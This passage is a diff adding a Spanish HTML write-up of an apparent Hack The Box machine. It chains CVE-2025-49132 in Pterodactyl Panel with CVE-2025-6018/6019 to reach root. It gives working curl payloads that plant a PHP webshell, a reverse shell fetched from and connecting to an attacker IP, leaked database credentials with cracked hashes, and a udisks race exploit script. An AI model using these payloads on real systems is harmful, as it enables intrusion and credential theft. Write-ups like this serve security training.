+                    <li><strong>Pterodactyl Panel v1.11.10</strong> está instalado y servido bajo un subdominio.</li>
+                    <li><strong>PHP-PEAR</strong> ha sido habilitado explícitamente para la gestión de paquetes PHP.</li>
+                    <li>Se ha añadido una página de depuración temporal con <strong>phpinfo()</strong>.</li>
+                    <li>La pila incluye <strong>MariaDB 11.8.3</strong> y <strong>nginx 1.21.5</strong>.</li>
+                </ul>
+
+                <p>Ejecutar <code>whatweb</code> contra el sitio confirma la versión de PHP:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#4ec9b0;">http://pterodactyl.htb/</span> [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[<span style="color:#ce9178;">nginx/1.21.5</span>], IP[10.129.1.225], PHP[<span style="color:#ce9178;">8.4.8</span>], Script, Title[My Minecraft Server], X-Powered-By[PHP/8.4.8], nginx[1.21.5]</code></pre>
+
+                <p>El fuzzing de virtual hosts descubre un tercer subdominio:</p>
+
+                <pre><code class="language-plaintext">panel.pterodactyl.htb  Status: 200 [Size: 1897]</code></pre>
+
+                <p>Lo añado al <code>/etc/hosts</code>. El fuzzing de directorios con gobuster confirma también que
+                    la página phpinfo existe en <code>http://pterodactyl.htb/phpinfo.php</code>. La salida de phpinfo
+                    muestra la directiva <code>include_path</code>, que revela la ruta exacta de instalación de PEAR
+                    en este sistema — esto será esencial para el exploit:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#9cdcfe;">include_path</span>    .:/usr/share/php8:<span style="color:#ce9178;">/usr/share/php/PEAR</span>    .:/usr/share/php8:/usr/share/php/PEAR</code></pre>
+
+                <h2>Panel Pterodactyl — CVE-2025-49132</h2>
+                <p>Al navegar a <code>panel.pterodactyl.htb</code> se confirma la interfaz del Panel Pterodactyl:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Página de login de Pterodactyl Panel v1.11.10 en panel.pterodactyl.htb" /></p>
+
+                <p>Pterodactyl es un panel de administración de servidores de juegos de código abierto (<a
+                        href="https://pterodactyl.io/">https://pterodactyl.io/</a>). La versión 1.11.10 es vulnerable a
+                    <a href="https://github.com/advisories/GHSA-24wv-6c99-f843">CVE-2025-49132</a>, una vulnerabilidad
+                    crítica de <strong>ejecución remota de código sin autenticación</strong>.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad abusa de la forma en que Pterodactyl Panel gestiona la carga de locales. El panel
+                    expone un endpoint en <code>/locales/locale.json</code> que acepta un parámetro
+                    <code>locale</code> para la resolución de ficheros de locale por ruta y un parámetro
+                    <code>namespace</code> para la clave JSON. Al pasar <code>pearcmd</code> como namespace, la
+                    petición es gestionada por la infraestructura CLI de configuración de PHP-PEAR en lugar del
+                    código habitual del panel.</p>
+
+                <p>Combinado con el argumento <code>+config-create+</code> y un path traversal en el parámetro
+                    <code>locale</code>, esto permite a un atacante escribir contenido PHP arbitrario en un fichero
+                    del disco — creando efectivamente un webshell. Una segunda petición carga ese fichero atravesando
+                    de vuelta hasta <code>/tmp</code>, desencadenando la ejecución de código.</p>
+
+                <p>Hay una PoC disponible en: <a
+                        href="https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py">https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py</a>
+                </p>
+
+                <p>La estructura genérica del payload en dos pasos es:</p>
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://{host}/locales/locale.json?+config-create+&amp;locale=../../../../../usr/local/lib/php&amp;namespace=pearcmd&amp;&lt;?=system('{payload}')?&gt;+/tmp/payload.php"</span>
+
+<span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://{host}/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload"</span></code></pre>
+
+                <p>La primera petición crea el fichero de payload PHP mediante el mecanismo de configuración de PEAR;
+                    la segunda lo activa referenciándolo como un fichero de locale.</p>
+
+                <h3>Adaptando el Exploit a Este Objetivo</h3>
+                <p>Usar la ruta por defecto <code>/usr/local/lib/php</code> (como se muestra en la PoC genérica) no
+                    funciona aquí — produce la siguiente respuesta JSON sin ninguna ejecución de código:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+&amp;locale=../../../../../usr/local/lib/php&amp;namespace=pearcmd&amp;&lt;?=system('id')?&gt;+/tmp/payload.php"</span></code></pre>
+                <pre><code class="language-json">{<span style="color:#ce9178;">"..\/..\/..\/..\/..\/usr\/local\/lib\/php"</span>:{<span style="color:#ce9178;">"pearcmd"</span>:[]}}</code></pre>
+
+                <p>Según la documentación de la vulnerabilidad, una explotación exitosa debería devolver un error HTTP
+                    500 (porque la escritura del config de PEAR provoca un error de parseo de PHP), no una respuesta
+                    JSON limpia. Dado que la página phpinfo reveló que PEAR reside en
+                    <code>/usr/share/php/PEAR</code>, modifico la ruta en consecuencia:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system('id')?&gt;+/tmp/payload5.php"</span></code></pre>
+
+                <p>Esta vez, PEAR procesa la petición correctamente y devuelve su salida de configuración, confirmando
+                    que el webshell ha sido escrito en disco. Al activarlo:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload5"</span></code></pre>
+
+                <p>Devuelve una salida que contiene el resultado del comando <code>id</code> incrustado en el blob de
+                    configuración de PEAR — RCE confirmado como <code>wwwrun</code>.</p>
+
+                <h3>Obteniendo una Reverse Shell</h3>
+                <p>Los espacios en el comando de shell no pueden pasarse como espacios literales ni como caracteres
+                    URL-encoded en este contexto — el parseo del parámetro URL los elimina. La solución estándar
+                    es usar el separador de campo interno de la shell <code>${IFS}</code> como sustituto del espacio.
+                    Primero verifico la conectividad con un curl de vuelta simple:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system('curl\$\{IFS\}10.10.16.94')?&gt;+/tmp/payload2.php"</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload2"</span></code></pre>
+
+                <p>Mi servidor HTTP recibe la petición, confirmando conectividad de salida desde el objetivo:</p>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.1.225 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Para enviar la reverse shell de forma limpia, la hosteo como <code>index.html</code> en mi
+                    servidor HTTP Python y la pipeo a bash desde el objetivo. Mi <code>index.html</code>
+                    contiene:</p>
+
+                <pre><code class="language-bash"><span style="color:#c586c0;">bash</span> -c <span style="color:#ce9178;">"bash -i &gt;&amp; /dev/tcp/10.10.16.94/443 0&gt;&amp;1"</span></code></pre>
+
+                <p>Arranco mi servidor Python en el puerto 80, me pongo en escucha con netcat en el puerto 443 y
+                    envío el payload:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system('curl\$\{IFS\}10.10.16.94\$\{IFS\}|bash')?&gt;+/tmp/payload3.php"</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload3"</span></code></pre>
+
+                <p>El objetivo descarga mi script de shell y lo ejecuta:</p>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.1.225 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.94] from (UNKNOWN) [10.129.1.225] 52228
+bash: cannot set terminal process group (1209): Inappropriate ioctl for device
+bash: no job control in this shell
+wwwrun@pterodactyl:/var/www/pterodactyl/public></code></pre>
+
+                <p>Acceso inicial obtenido como <code>wwwrun</code>.</p>
+
+                <h2>Enumeración Local</h2>
+                <p>Listando <code>/home</code> se descubren dos cuentas de usuario:</p>
+
+                <pre><code class="language-plaintext">drwxr-x--- 1 headmonitor  users  140 Dec 31 17:29 headmonitor
+drwxr-xr-x 1 phileasfogg3 users  156 Dec 31 17:29 phileasfogg3</code></pre>
+
+                <p>Ambos pertenecen al grupo <code>users</code>. El directorio home de
+                    <code>phileasfogg3</code> es legible por todos y la flag de usuario reside allí.</p>
+
+                <p>El fichero <code>.env</code> de la aplicación en <code>/var/www/pterodactyl/.env</code> filtra
+                    credenciales de base de datos:</p>
+
+                <pre><code class="language-ini"><span style="color:#9cdcfe;">DB_CONNECTION</span>=<span style="color:#ce9178;">mysql</span>
+<span style="color:#9cdcfe;">DB_HOST</span>=<span style="color:#ce9178;">127.0.0.1</span>
+<span style="color:#9cdcfe;">DB_PORT</span>=<span style="color:#ce9178;">3306</span>
+<span style="color:#9cdcfe;">DB_DATABASE</span>=<span style="color:#ce9178;">panel</span>
+<span style="color:#9cdcfe;">DB_USERNAME</span>=<span style="color:#ce9178;">pterodactyl</span>
+<span style="color:#9cdcfe;">DB_PASSWORD</span>=<span style="color:#ce9178;">PteraPanel</span>
+<span style="color:#9cdcfe;">REDIS_HOST</span>=<span style="color:#ce9178;">127.0.0.1</span>
+<span style="color:#9cdcfe;">REDIS_PASSWORD</span>=<span style="color:#ce9178;">null</span>
+<span style="color:#9cdcfe;">REDIS_PORT</span>=<span style="color:#ce9178;">6379</span></code></pre>
+
+                <p>Conectando a MariaDB con estas credenciales y consultando la base de datos <code>panel</code>:</p>
+
+                <pre><code class="language-sql"><span style="color:#569cd6;">select</span> username, password <span style="color:#569cd6;">from</span> users;</code></pre>
+
+                <pre><code class="language-plaintext">+--------------+--------------------------------------------------------------+
+| username     | password                                                     |
++--------------+--------------------------------------------------------------+
+| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
+| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
++--------------+--------------------------------------------------------------+</code></pre>
+
+                <p>Pasando estos hashes bcrypt por hashcat se crackea la contraseña de
+                    <code>phileasfogg3</code>:</p>
+
+                <pre><code class="language-plaintext">$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:<span style="color:#4ec9b0;">!QAZ2wsx</span></code></pre>
+
+                <p>Me conecto por SSH como <code>phileasfogg3</code> usando esta contraseña y compruebo los
+                    privilegios sudo:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">sudo</span> -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for phileasfogg3 on pterodactyl:
+    always_set_home, env_reset,
+    env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME
+    LC_ALL LANGUAGE LINGUAS XDG_SESSION_COOKIE", !insults,
+    secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw
+
+User phileasfogg3 may run the following commands on pterodactyl:
+    (ALL) ALL</code></pre>
+
+                <p>A primera vista parece sudo sin restricciones, pero la directiva <code>targetpw</code> exige la
+                    contraseña del usuario <em>destino</em> (es decir, root), no la del usuario actual. Sin la
+                    contraseña de root, esta entrada es prácticamente inútil.</p>
+
+                <h3>Pista en el Correo</h3>
+                <p><code>phileasfogg3</code> tiene un correo en <code>/var/mail/phileasfogg3</code>:</p>
+
+                <pre><code class="language-plaintext">From: headmonitor &lt;headmonitor@pterodactyl&gt;
+To: All Users &lt;all@pterodactyl&gt;
+Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
+
+Attention all users,
+
+Unusual activity has been observed from the udisks daemon (udisksd).
+No confirmed compromise at this time, but increased vigilance is required.
+
+Do not connect untrusted external media. Review your sessions for suspicious
+activity. Administrators should review udisks and system logs and apply pending
+updates.
+
+Report any signs of compromise immediately to headmonitor@pterodactyl.htb
+
+— HeadMonitor
+System Administrator</code></pre>
+
+                <p>La mención explícita de <code>udisksd</code> es una pista clara hacia el vector de escalada de
+                    privilegios. El sistema operativo también es relevante:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">cat</span> /etc/os-release</code></pre>
+
+                <pre><code class="language-plaintext">NAME="openSUSE Leap"
+VERSION="15.6"
+ID="opensuse-leap"</code></pre>
+
+                <p>También es destacable que el <code>PATH</code> de este usuario tiene
+                    <code>/home/phileasfogg3/bin</code> como primer elemento, lo cual puede ser relevante para
+                    técnicas basadas en rutas.</p>
+
+                <h2>Escalada de Privilegios — CVE-2025-6018 + CVE-2025-6019</h2>
+                <p>Investigando vulnerabilidades en <code>udisks</code> sobre openSUSE se encuentran dos CVEs
+                    encadenables documentados en <a
+                        href="https://socprime.com/blog/cve-2025-6018-and-cve-2025-6019-lpe-vulnerabilities/">https://socprime.com/blog/cve-2025-6018-and-cve-2025-6019-lpe-vulnerabilities/</a>:
+                </p>
+
+                <ul>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/cve-2025-6018">CVE-2025-6018</a> — Escalada local
+                        de privilegios en PAM <code>pam_env</code> mediante <code>~/.pam_environment</code></li>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/cve-2025-6019">CVE-2025-6019</a> — Exploit de race
+                        condition en el montaje de udisks con Polkit <code>allow_active</code></li>
+                </ul>
+
+                <h3>CVE-2025-6018 — Falsificando la Presencia Física mediante PAM</h3>
+                <p>Ciertas acciones de Polkit, incluyendo la capacidad de montar sistemas de archivos mediante
+                    <code>udisks</code>, están condicionadas al flag <code>allow_active</code>. Este flag normalmente
+                    solo se concede a usuarios que están físicamente presentes en la máquina (es decir, en una TTY
+                    local), no a sesiones SSH.</p>
+
+                <p>CVE-2025-6018 explota un fallo en el módulo <code>pam_env</code> de PAM: confía en el fichero
+                    de entorno del propio usuario (<code>~/.pam_environment</code>) sin validación suficiente. Al
+                    crear este fichero con el siguiente contenido, se engaña al sistema para que crea que la
+                    sesión SSH es un inicio de sesión físico local:</p>
+
+                <pre><code class="language-ini"><span style="color:#9cdcfe;">XDG_SEAT</span>=<span style="color:#ce9178;">seat0</span>
+<span style="color:#9cdcfe;">XDG_VTNR</span>=<span style="color:#ce9178;">1</span></code></pre>
+
+                <p><code>XDG_SEAT=seat0</code> identifica un asiento físico, y <code>XDG_VTNR=1</code> asigna un
+                    número de terminal virtual — ambas son condiciones que Polkit verifica para determinar si una
+                    sesión se considera "activa" en el sentido local. Con estas variables definidas, al
+                    reautenticarse (por ejemplo, mediante un nuevo login SSH o <code>su</code>), PAM las carga y
+                    otorga el permiso <code>allow_active</code> a la sesión.</p>
+
+                <h3>CVE-2025-6019 — Race Condition en el Montaje de udisks (Exploit SUID)</h3>
+                <p>Con el flag <code>allow_active</code> activo, <code>udisks</code> permite al usuario montar
+                    sistemas de archivos. Normalmente, los sistemas de archivos montados por usuarios llevan los
+                    flags <code>nosuid</code> y <code>nodev</code>, que impiden que los binarios SUID sean
+                    efectivos.</p>
+
+                <p>CVE-2025-6019 explota una race condition durante una operación de redimensionado del sistema de
+                    archivos: cuando se desencadena un resize a través de la interfaz D-Bus
+                    (<code>org.freedesktop.UDisks2.Filesystem.Resize</code>), existe una breve ventana en la que el
+                    sistema de archivos se remonta <em>sin</em> los flags de seguridad. Si durante esa ventana
+                    existe un binario SUID en ese sistema de archivos y se ejecuta, lo hará con privilegios
+                    elevados.</p>
+
+                <p>El flujo de explotación es:</p>
+                <ol>
+                    <li>Crear una imagen XFS en la máquina atacante con un binario bash SUID.</li>
+                    <li>Transferir la imagen al objetivo.</li>
+                    <li>Montar la imagen como dispositivo de bucle mediante <code>udisksctl loop-setup</code>.</li>
+                    <li>Mantener el sistema de archivos "ocupado" en segundo plano para evitar el desmontaje
+                        automático.</li>
+                    <li>Desencadenar un redimensionado del sistema de archivos mediante <code>gdbus call</code> a la
+                        interfaz UDisks2 — esto provoca la race condition.</li>
+                    <li>Localizar la bash SUID en <code>/tmp/blockdev*/bash</code> y ejecutarla con
+                        <code>-p</code> para preservar el UID efectivo.</li>
+                </ol>
+
+                <h3>Preparando la Imagen XFS</h3>
+                <p>En la máquina atacante, creo una imagen de sistema de archivos XFS con un binario bash SUID
+                    integrado:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">dd</span> if=/dev/zero of=xfs.image bs=1M count=300
+<span style="color:#569cd6;">mkfs.xfs</span> -f xfs.image
+<span style="color:#569cd6;">mount</span> xfs.image /mnt
+<span style="color:#569cd6;">cp</span> /bin/bash /mnt/bash
+<span style="color:#569cd6;">chmod</span> 4755 /mnt/bash
+<span style="color:#569cd6;">umount</span> /mnt</code></pre>
+
+                <p>A continuación la sirvo con un servidor HTTP Python y la descargo en el objetivo con
+                    <code>wget</code> o <code>curl</code>.</p>
+
+                <h3>Aplicando CVE-2025-6018 y Ejecutando el Exploit</h3>
+                <p>Primero creo el fichero <code>~/.pam_environment</code> como <code>phileasfogg3</code> y vuelvo
+                    a iniciar sesión vía SSH para que las variables PAM se carguen en la sesión. Con el permiso
+                    <code>allow_active</code> ahora vigente, ejecuto el script del exploit adaptado de la PoC en
+                    <a
+                        href="https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh">https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh</a>.
+                    La lógica relevante del exploit es:</p>
+
+                <pre><code class="language-bash"><span style="color:#6a9955;"># Configurar dispositivo de bucle</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Setting up loop device..."</span>
+<span style="color:#9cdcfe;">LOOP_DEV</span>=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction | grep -o <span style="color:#ce9178;">'/dev/loop[0-9]*'</span>)
+
+<span style="color:#c586c0;">if</span> [ -z <span style="color:#ce9178;">"$LOOP_DEV"</span> ]; then
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[-] Error: Failed to set up loop device."</span>
+    <span style="color:#c586c0;">exit</span> 1
+<span style="color:#c586c0;">fi</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] Loop device configured: $LOOP_DEV"</span>
+
+<span style="color:#6a9955;"># Mantener el sistema de archivos ocupado para evitar el desmontaje</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Keeping filesystem busy to prevent unmounting..."</span>
+<span style="color:#c586c0;">while</span> true; do /tmp/blockdev*/bash -c <span style="color:#ce9178;">'sleep 10; ls -l /tmp/blockdev*/bash'</span> &amp;&amp; <span style="color:#c586c0;">break</span>; done 2>/dev/null &amp;
+<span style="color:#9cdcfe;">LOOP_PID</span>=$!
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] Background loop started (PID: $LOOP_PID)"</span>
+
+<span style="color:#6a9955;"># Redimensionar el sistema de archivos para desencadenar el montaje (race condition)</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Resizing filesystem to trigger mount..."</span>
+<span style="color:#c586c0;">for</span> i in {1..3}; do
+    gdbus call --system --dest org.freedesktop.UDisks2 \
+        --object-path <span style="color:#ce9178;">"/org/freedesktop/UDisks2/block_devices/${LOOP_DEV##*/}"</span> \
+        --method org.freedesktop.UDisks2.Filesystem.Resize 0 <span style="color:#ce9178;">'{}'</span> > gdbus_output.txt 2>&amp;1
+
+    <span style="color:#c586c0;">if</span> grep -q <span style="color:#ce9178;">"Error resizing filesystem"</span> gdbus_output.txt; then
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] Mount successful (expected error: target is busy)."</span>
+        <span style="color:#c586c0;">break</span>
+    <span style="color:#c586c0;">fi</span>
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Intento $i: Respuesta inesperada, reintentando en 1 segundo..."</span>
+    <span style="color:#c586c0;">sleep</span> 1
+
+    <span style="color:#c586c0;">if</span> [ $i -eq 3 ]; then
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[-] Error: Failed to resize filesystem after 3 attempts."</span>
+        kill $LOOP_PID 2>/dev/null
+        udisksctl loop-delete --block-device <span style="color:#ce9178;">"$LOOP_DEV"</span> 2>/dev/null
+        rm -f gdbus_output.txt
+        <span style="color:#c586c0;">exit</span> 1
+    <span style="color:#c586c0;">fi</span>
+<span style="color:#c586c0;">done</span>
+
+<span style="color:#6a9955;"># Esperar a que el montaje se estabilice</span>
+<span style="color:#c586c0;">sleep</span> 2
+
+<span style="color:#6a9955;"># Buscar la bash SUID</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Checking for SUID bash in /tmp/blockdev*..."</span>
+<span style="color:#9cdcfe;">SUID_BASH</span>=<span style="color:#ce9178;">""</span>
+<span style="color:#c586c0;">for</span> i in {1..5}; do
+    <span style="color:#9cdcfe;">SUID_BASH</span>=$(find /tmp -maxdepth 2 -path <span style="color:#ce9178;">"/tmp/blockdev*/bash"</span> -perm -4000 -type f 2>/dev/null)
+    <span style="color:#c586c0;">if</span> [ -n <span style="color:#ce9178;">"$SUID_BASH"</span> ]; then
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] SUID bash found: $SUID_BASH"</span>
+        ls -l <span style="color:#ce9178;">"$SUID_BASH"</span>
+        <span style="color:#c586c0;">break</span>
+    <span style="color:#c586c0;">fi</span>
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Intento $i: bash SUID no encontrada, reintentando..."</span>
+    <span style="color:#c586c0;">sleep</span> 1
+<span style="color:#c586c0;">done</span>
+
+<span style="color:#c586c0;">if</span> [ -z <span style="color:#ce9178;">"$SUID_BASH"</span> ]; then
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[-] Error: bash SUID no encontrada tras 5 intentos."</span>
+    kill $LOOP_PID 2>/dev/null
+    udisksctl loop-delete --block-device <span style="color:#ce9178;">"$LOOP_DEV"</span> 2>/dev/null
+    rm -f gdbus_output.txt
+    <span style="color:#c586c0;">exit</span> 1
+<span style="color:#c586c0;">fi</span>
+
+<span style="color:#6a9955;"># Ejecutar la shell SUID</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Executing root shell..."</span>
+<span style="color:#ce9178;">"$SUID_BASH"</span> -p</code></pre>
+
+                <p>Ejecutando el script se produce la siguiente salida y se cae en una shell de root:</p>
+
+                <pre><code class="language-plaintext">[*] Setting up loop device...
+[+] Loop device configured: /dev/loop0
+[*] Keeping filesystem busy to prevent unmounting...
+[+] Background loop started (PID: 16800)
+[*] Resizing filesystem to trigger mount...
+[+] Mount successful (expected error: target is busy).
+[*] Waiting 2 seconds for mount to stabilize...
+[*] Checking for SUID bash in /tmp/blockdev*...
+[+] SUID bash found: /tmp/blockdev.MKY3J3/bash
+-rwsr-xr-x 1 root root 1380656 Feb  8 20:57 /tmp/blockdev.MKY3J3/bash
+[*] Executing root shell...
+bash-5.3#</code></pre>
+
+                <p>Shell de root obtenida. La flag de root está en <code>/root/root.txt</code>.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
